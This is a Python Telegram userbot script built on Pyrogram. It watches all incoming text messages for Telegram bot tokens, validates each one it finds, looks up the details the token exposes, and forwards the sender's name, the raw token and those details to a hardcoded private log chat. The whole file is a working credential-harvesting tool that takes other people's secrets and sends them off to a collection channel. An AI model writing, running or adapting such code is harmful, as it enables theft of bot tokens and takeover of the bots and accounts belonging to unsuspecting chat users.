from pyrogram import Client, filters, types
import utils
import logging


logging.basicConfig(level=logging.INFO)
app = Client('bot')
log = -1001494741712


@app.on_message(~filters.me & filters.text)
async def main(client: Client, message: types.Message):
    user = message.from_user or message.sender_chat
    if user.id == 93372553:  #  respect botfather & kill all weaklings
        return
    val, token = utils.check(message.text)
    if token and utils.validate(token):
        valid = await utils.request(token)     
        text = f"from: {message.from_user.mention}\ntoken: `{token}`\n"
        if valid:
            for field, value in valid.items():
                text += (f"{field.replace('_',' ')}: `{value}`\n")
        else:
            text += '**Expired Token**'
        await client.send_message(log, text)


app.run()